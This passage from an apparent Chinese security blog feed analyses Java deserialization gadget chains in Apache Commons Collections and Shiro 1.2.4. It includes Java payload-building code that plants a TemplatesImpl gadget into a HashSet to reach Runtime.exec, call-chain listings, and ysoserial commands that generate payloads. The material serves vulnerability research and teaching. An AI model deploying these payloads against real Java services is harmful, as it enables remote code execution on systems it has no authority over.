class="comment">// TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); //原来的利用方式</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, templates);</span><br></pre></td></tr></table></figure><p>这里将无意义的<code>foo</code>改造成了触发<code>TemplatesImpl.newTransformer</code>的trigger。</p><p>而在<code>TiedMapEntry</code>前的利用链，在原生shiro环境下，并不冲突（没有数组类型的对象），可以正常反序列化。这一部分就省略了。</p><h4 id="20200108补充"><a href="#20200108补充" class="headerlink" title="20200108补充"></a>20200108补充</h4><p>其实createTemplatesImpl的利用方式中还是存在数组形式的，byte[]数组用于存储evil class。但是在tomcat 7及以上的环境下，java的原生数据类型的数组还原不影响反序列化，只针对对象级别的数组还原。而tomcat6的实现方式直接不允许数组类型的还原，也就是说该利用链在tomcat6的环境下是成功不了的。</p><h3 id="20200109补充"><a href="#20200109补充" class="headerlink" title="20200109补充"></a>20200109补充</h3><p>当应用开启了security manager时，需要设置<code>-Djdk.xml.enableTemplatesImplDeserialization=true</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20200109193558744.png" alt="image-20200109193558744"></p><h1 id="0x04-EXP编写"><a href="#0x04-EXP编写" class="headerlink" title="0x04 EXP编写"></a>0x04 EXP编写</h1><p>这里其实可以构造出好几个链，我这里就拿<code>HashSet</code>为例，完整的exp见<a href="https://github.com/wh1t3p1g/ysoserial" target="_blank" rel="noopener">MyYsoserial</a>中的<code>CommonsCollections10</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);<span class="comment">// 构造带有evil class bytes的TemplatesImpl</span></span><br><span class="line"><span class="comment">// 构造InvokerTransformer，填充无害的toString函数</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="comment">// 构造LazyMap的factory为前面的InvokerTransformer</span></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"><span class="comment">// 填充TiedMapEntry的map（lazyMap）和key（TemplatesImpl）</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br><span class="line"><span class="comment">// 下述代码将entry填充到HashSet的node的key上，可以使得HashSet在put的时候调用TiedMapEntry的hashCode函数</span></span><br><span class="line">Field f = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField("map");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f);</span><br><span class="line">HashMap innimpl = <span class="keyword">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">Field f2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f2);</span><br><span class="line">Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(keyField);</span><br><span class="line">keyField.set(node, entry);</span><br><span class="line"><span class="comment">// 将最终的触发函数newTransformer装载到InvokerTransformer上</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure><p>这里不对源码进行讲解了，都写在了注释里。</p><p>这里整理一下这条链的调用过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashSet.readObject()</span><br><span class="line">-&gt; java.util.HashMap.put()</span><br><span class="line">-&gt; java.util.HashMap.hash()</span><br><span class="line">-&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">-&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">-&gt; org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">-&gt; org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">-&gt; java.lang.reflect.Method.invoke()</span><br><span class="line">      ... templates gadgets ...</span><br><span class="line">      -&gt; java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>在经过对<code>CommonsCollections</code>系列的利用链进行分析后，在shiro这个问题上，进行了实战，解决了tomcat下无法利用shiro原生的<code>commons-collections:3.2.1</code>这个问题。</p><p>最后，在最近的<a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">shiro-721</a>利用上，这个利用链希望可以帮助到大家</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110151222301.png" alt="image-20191110151222301"></p><p>Happy Hacking XD</p><hr>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化利用链挖掘之CommonsCollections2,4,8</title>
      <link href="2019/11/05/java/study-java-deserialized-commonscollections4/"/>
      <url>2019/11/05/java/study-java-deserialized-commonscollections4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前面几篇文章，分析了CommonsCollections:3.2.1版本以下存在的反序列化链。今天将继续分析CommonsCollections:4.0版本，主要讲述CommonsCollections2，4，8的利用链构造。</p><a id="more"></a><h1 id="0x01-前景回顾"><a href="#0x01-前景回顾" class="headerlink" title="0x01 前景回顾"></a>0x01 前景回顾</h1><p>commons-collections:4.0版本其实并没有像3.2.2版本的修复方式一样做拉黑处理，所以在3.2.1及以下的利用链改改还是可以用的。<br>例如CommonsCollections5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Map&lt;String, String&gt; innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>将innerMap改成键值对的申明方式即可，但是大家是不是还记得，除了用LazyMap的方式，CommonsCollections3曾提到过使用<code>TrAXFilter</code>类初始化的方式来载入任意的class bytes数组。</p><p>commons-collections:4.0版本下的利用链，用的都是TemplatesImpl作为最终的命令执行的代码调用，由于前面分析过这个利用方式，后文不再复述。</p><h1 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h1><h2 id="1-CommonsCollections2-4"><a href="#1-CommonsCollections2-4" class="headerlink" title="1. CommonsCollections2,4"></a>1. CommonsCollections2,4</h2><p>CommonsCollections2,4都用到了一个新的类<code>PriorityQueue</code>的<code>Comparator</code>来触发<code>transform</code>函数，两者的区别在于中间的桥接用的不同的Transformer对象。先来看一下<code>PriorityQueue.readObject</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105144356952.png" alt="image-20191105144356952"></p><p>框框里的主要工作为反序列化恢复该对象的数据，我们重点关注<code>heapify()</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105144742407.png" alt="image-20191105144742407"></p><p>继续跟进<code>siftDown</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105144814493.png" alt="image-20191105144814493"></p><p>当我们在实例化对象时提供了<code>comparator</code>，将会来到我们最终触发compare的位置，看一下<code>siftDownUsingComparator</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105145042981.png" alt="image-20191105145042981"></p><p>这里调用了我们传入的comparator，并调用其compare，利用链中使用了<code>TransformingComparator</code>,来看一下它的compare函数</p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105145452819.png" alt="image-20191105145452819"></p><p>调用了当前的transformer的transform函数，看到这里，其实已经很熟了，前面分析的很多利用链都跟transform有关，并且4.0版本并没有拉黑相关的transformer。所以接下来，我们就可以用前面的一些思路了。</p><ol><li><p>CommonsCollections2</p><p>CommonsCollections2利用了InvokerTransformer类的任意类函数调用的transform，传入构造好的templates gadget并调用    <code>TemplatesImpl.newTransformer</code></p></li><li><p>CommonsCollections4</p><p>CommonsCollections4后续用的方法同CommonsCollections3一样，用<code>InstantiateTransformer</code>来触发<code>TrAXFilter</code>的初始化，最终也将调用<code>TemplatesImpl.newTransformer</code></p></li></ol><p>整理一下利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollection2:</span><br><span class="line">PriorityQueue.readObject</span><br><span class="line">-&gt; PriorityQueue.heapify()</span><br><span class="line">-&gt; PriorityQueue.siftDown()</span><br><span class="line">-&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br><span class="line"></span><br><span class="line">CommonsCollection4:</span><br><span class="line">PriorityQueue.readObject</span><br><span class="line">-&gt; PriorityQueue.heapify()</span><br><span class="line">-&gt; PriorityQueue.siftDown()</span><br><span class="line">-&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; InstantiateTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="2-CommonsCollections8"><a href="#2-CommonsCollections8" class="headerlink" title="2.CommonsCollections8"></a>2.CommonsCollections8</h2><p>CommonsCollections8是今年<strong><a href="https://github.com/navalorenzo" target="_blank" rel="noopener">navalorenzo</a></strong>推送到ysoserial上的，8与2，4的区别在于使用了新的readObject触发点<code>TreeBag</code></p><p>来看一下<code>TreeBag.readObject</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105154637160.png" alt="image-20191105154637160"></p><p>这里的两个关键点<code>TreeBag</code>的父类的<code>doReadObject</code>函数和<code>TreeMap</code>.</p><p>看一下<code>doReadObject</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105155805597.png" alt="image-20191105155805597.png"></p><p>这里对传入的TreeMap调用了<code>put</code>函数</p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105155659102.png" alt="image-20191105155659102"></p><p>继续跟进<code>compare</code>函数</p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105155936014.png" alt="image-20191105155936014"></p><p>这里又回到了熟悉的<code>comparator.compare</code>函数，其中<code>comparator</code>就是我们构造的<code>TransformingComparator</code></p><p>后续跟CommonsCollections2相同，就不复述了。</p><p>整理一下利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TreeBag.readObject()</span><br><span class="line">-&gt; AbstractMapBag.doReadObject()</span><br><span class="line">-&gt; TreeMap.put()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="3-commons-collections-4-1及以上的改变"><a href="#3-commons-collections-4-1及以上的改变" class="headerlink" title="3. commons-collections:4.1及以上的改变"></a>3. commons-collections:4.1及以上的改变</h2><p>前面提到的CommonsCollections2,4,8，都是在commons-collections:4.0版本下才可以使用的。这里我们来看看为什么在4.1及以上版本无法利用！</p><p>前面我们用到了InvokerTransformer和InstantiateTransformer作为中转，很真实，4.1版本这两个类都没有实现Serializable接口，导致我们在序列化时就无法利用这两个类。emmmmm，直接干掉了上面的2，4，8。</p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105161531047.png" alt="image-20191105161531047"></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105161550587.png" alt="image-20191105161550587"></p><p>这个改变意味着我们需要从其他可操作危险方法的对象了。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>分析完ysoserial里的commons-collections系列的payloads，我们可以简单总结一下Java的反序列化挖掘思路（不涉及技术点，个人的一些想法）。</p><h2 id="1-最终的利用效果"><a href="#1-最终的利用效果" class="headerlink" title="1. 最终的利用效果"></a>1. 最终的利用效果</h2><p>在利用链构造中，我们肯定希望最终可以达到任意命令执行或者是任意代码执行的效果，这样会使得反序列化漏洞的威力最大化。所以我们很开心能看到InvokerTransformer的transform函数，他利用反射机制来调用任意的代码，也意味着我们能控制任意类的调用执行。但是在实际的挖掘中，除了对反射机制的挖掘和defineClass类型的挖掘，我们也应该注意到其他可能会存在的危险利用，如任意文件写入，任意文件删除等等。</p><h2 id="2-利用链总体的一个挖掘思路"><a href="#2-利用链总体的一个挖掘思路" class="headerlink" title="2. 利用链总体的一个挖掘思路"></a>2. 利用链总体的一个挖掘思路</h2><p>我们在分析完所有的CommonsCollections的payloads很容易发现的一点是很多payloads“杂交”组合了多个可利用的节点。那么我们在实际的挖掘中，我们需要首先能获知哪些库文件里有哪些可利用的节点，然后根据一定的规则来进行一个链条的连接。</p><p>那么来看一下，可利用的节点是什么？</p><ol><li>实现了<code>Serializable</code>接口，枚举出所有可以被序列化的类。</li><li>该类的类属性做了函数调用或函数的返回值，如<code>TreeMap.map.put()</code>和<code>ConstantTransformer.transform</code>直接返回<code>iConstant</code>类属性。如果不存在上述的情况，我们可以忽略。</li><li>实现了<code>readObject</code>函数，这种情况可作为起始点，也可以作为桥接点，需要具体判断其代码的实现。</li><li>实现了<code>invoke</code>函数，这种情况可作为桥接点，利用了代理机制。</li><li>从<code>readObject</code>函数和<code>invoke</code>函数，衍生出来的类属性函数调用，这边可能会引向其他的类函数，如<code>TreeBag.readObject</code>的实现，将引向下一步的父类函数<code>doReadObject</code>函数。这里就需要做一个人工或者是静态的代码分析。</li></ol><p>接下来，关于可利用节点的串联，其实主要依赖于第5点的挖掘，我们需要根据经验或者是静态的代码分析来做。</p><p>根据上面的一个分析，其实我们可以做到一个自动化的利用链发掘，<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><p>这个工具就是一个很好的实现，后续将对其进行一个分析。</p><p>从commons-collections的防护来看，我们越来越无法在单个库里面实现一个可利用的利用链，这也意味着我们需要对不同的项目做针对性的分析，所以gadetinspector这个工具的重要性就不言而喻了。下一步将重点分析一下该工具的实现。</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</title>
      <link href="2019/10/31/java/study-java-deserialized-commonscollections3-others/"/>
      <url>2019/10/31/java/study-java-deserialized-commonscollections3-others/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文继续分析CommonsCollections的相关反序列化利用链，这次主要分析CommonsCollections5,6,7，以及我找的一个新利用链，这里暂且将其称为10.</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><hr><p>jdk8，commons-collections:3.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections5.ser</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections6.ser</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections7.ser</span><br></pre></td></tr></table></figure><h1 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h1><hr><h2 id="1-背景回顾"><a href="#1-背景回顾" class="headerlink" title="1. 背景回顾"></a>1. 背景回顾</h2><p>前面提到过CommonsCollections1和3在构造AnnotationInvocationHandler时用到了Override.class。但是如果你在jdk8的环境下去载入生成的payload，会发生<code>java.lang.Override missing element entrySet</code>的错误。</p><p>这个错误的产生原因主要在于jdk8更新了<code>AnnotationInvocationHandler</code><a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java" target="_blank" rel="noopener">参考</a></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029103316582.png" alt="image-20191029103316582"></p><p>jdk8不直接调用<code>s.defaultReadObject</code>来填充当前的<code>AnnotaionInvocationHandler</code>实例，而选择了单独填充新的变量。</p><p>这里我们回顾一下，1和3的payload的触发点是<code>LazyMap.get</code>函数，而触发这个函数需要使得<code>memberValues</code>为<code>LazyMap</code>对象</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029103756251.png" alt="image-20191029103756251"></p><p>显然，jdk8的操作使得<code>memberValues</code>并不是我们构造好的<code>LazyMap</code>类型。在调试中，可以看到此时的<code>memberValues</code>为<code>LinkedHashMap</code>对象，该对象无法获得<code>entrySet</code>的内容，所以会报前面的这个错误。</p><p>jdk8下CommonsCollections1和3无法成功利用了，但是如果我们可以找到一个替代AnnotationInvocationHandler的利用方式呢？这就是本文要讲的CommonsCollections5，6，7所做出的改变。</p><h2 id="2-重新构造前半部分利用链–CommonsCollections5"><a href="#2-重新构造前半部分利用链–CommonsCollections5" class="headerlink" title="2. 重新构造前半部分利用链–CommonsCollections5"></a>2. 重新构造前半部分利用链–CommonsCollections5</h2><p>CommonsCollections5与1的区别在于AnnotationInvocationHandler，后部分是相同的，所以这里不分析后部分。</p><p>AnnotationInvocationHandler在前面起到的作用是来触发LazyMap.get函数，所以我们接下来就是要重新找一个可以触发该函数的对象。这个对象满足</p><ul><li>类可序列化，类属性有个可控的Map对象或Object</li><li>该类的类函数上有调用这个Map.get的地方</li></ul><p>CommonsCollections5在这里用到了TiedMapEntry，来看一下</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029110642707.png" alt="image-20191029110642707"></p><p>TiedMapEntry有一个map类属性，且在getValue处调用了map.get函数。同时toString、hashCode、equals均调用了getValue函数，这里关注toString函数。</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029110812953.png" alt="image-20191029110812953"></p><p>toString函数通常在与字符串拼接时，会被自动调用。那么接下来我们需要找一个对象满足</p><ul><li>类可序列化，类属性有个Map.Entry对象或Object</li><li>该类会自动调用这个类属性的toString函数或前面的另外几种</li></ul><p>这里选择了<code>BadAttributeValueExpException</code>对象，他的<code>readObject</code>函数会自动调用类属性的<code>toString</code>函数。</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029111315584.png" alt="image-20191029111315584"></p><p>需要注意的是这里<code>System.getSecurityManager</code>为空，换句话说，就是当前的jvm环境不能启用安全管理器。</p><p>来看一下一整个调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">-&gt; valObj.toString() =&gt; TiedMapEntry.getValue</span><br><span class="line">-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; 前文构造的Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="3-重新构造前半部分利用链–CommonsCollections6"><a href="#3-重新构造前半部分利用链–CommonsCollections6" class="headerlink" title="3. 重新构造前半部分利用链–CommonsCollections6"></a>3. 重新构造前半部分利用链–CommonsCollections6</h2><p>CommonsCollections6是另一种替换方式，后半部分的利用链还是没有变，不作分析。</p><p>我们在2中提到了除了CommonsCollections5用的<code>toString</code>外，还有<code>hashCode</code>和<code>equals</code>函数也调用了getValue函数。那么是否存在调用这两个函数的对象函数呢？答案是肯定的！</p><p>CommonsCollections6利用了<code>TiedMapEntry</code>的<code>hashCode</code>函数，来触发<code>LazyMap.get</code></p><p>我们都知道HashSet集合里不会存在相同的key，那么是如何判断是否是相同的key呢？这里就要用到key的hashCode函数了，如果key的值相同，其hashCode返回的值也是相同的。这里的HashCode的计算在HashSet的put和add函数完成，并且HashSet从序列化数据中还原出来时会自动调用put函数，这里就给我们提供了可控的地方。</p><p>先来看一下HashSet的<code>readObject</code>函数</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029145451405.png" alt="image-20191029145451405"></p><p>继续跟put函数，这里其实调用的是HashMap的put函数</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029150815776.png" alt="image-20191029150815776"></p><p>其中对key调用的<code>hash()</code>函数会调用<code>key.hashCode</code>函数，那么现在就很清楚了，我们只要将key的值替换成构造好的<code>TiedMapEntry</code>对象就可以了。注意，这里的key值其实就是<code>HashSet.add</code>的实例，在HashSet里的HashMap类属性只用到了Key。</p><p>整理一下利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">-&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode</span><br><span class="line">-&gt; TiedMapEntry.getValue</span><br><span class="line">-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; 前文构造的Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="4-重新构造前半部分利用链–CommonsCollections7"><a href="#4-重新构造前半部分利用链–CommonsCollections7" class="headerlink" title="4. 重新构造前半部分利用链–CommonsCollections7"></a>4. 重新构造前半部分利用链–CommonsCollections7</h2><p>CommonsCollections7用了Hashtable来代替<code>AnnotationInvocationHandler</code>，不同于前面两种CommonsCollections7并未使用<code>TiedMapEntry</code>，而是用了相同key冲突的方式调用<code>equals</code>来触发<code>Lazy.get</code>函数。</p><p>先来看一下<code>Hashtable</code>的<code>readObject</code>函数</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029170332420.png" alt="image-20191029170332420"></p><p>继续跟进<code>reconstitutionPut</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029170517723.png" alt="image-20191029170517723"></p><p>该函数将填充table的内容，其中第1236行仅当有重复数据冲突时，才会进入下面的if语句，这里我们继续跟进<code>equals</code>函数</p><p>这里的<code>equals</code>函数取决于<code>key</code>的对象，利用链用的是<code>LazyMap</code>对象，实际调用的是父类<code>AbstractMapDecorator</code>的<code>equals</code>函数</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029173505843.png" alt="image-20191029173505843"></p><p>这里又调用了map的equals函数，这里实际调用的是HashMap的父类<code>AbstractMap</code>的<code>equals</code>函数</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029173654711.png" alt="image-20191029173654711"></p><p>在第495行调用了<code>m.get</code>函数，所以后面又是我们熟悉的<code>LazyMap.get</code>的套路了。</p><p>整理一下利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">-&gt; Hashtable.reconstitutionPut</span><br><span class="line">-&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals</span><br><span class="line">-&gt; m.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; 前文构造的Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="5-利用链构造"><a href="#5-利用链构造" class="headerlink" title="5. 利用链构造"></a>5. 利用链构造</h2><p>CommonsCollections6和7的exp构造比较复杂，这里单独拿出来讲一下。</p><hr><h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p>经过前面的分析，我们可以知道CommonsCollections6需要将构造好的TiedMapEntry实例添加到HashSet的值上。</p><p>简单的方法就是直接add</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(entry);</span><br></pre></td></tr></table></figure><p>复杂一点，就是ysoserail里的实现方法，采用反射机制来完成</p><p>其思路主要为：</p><ul><li>实例化一个HashSet实例</li><li>通过反射机制获取HashSet的map类属性</li><li>通过反射机制获取HashMap(map类属性)的table(Node&lt;K,V&gt;)类属性</li><li>通过反射机制获取Node的key类属性，并设置该key的值为构造好的TiedMapEntry实例</li></ul><p>具体代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 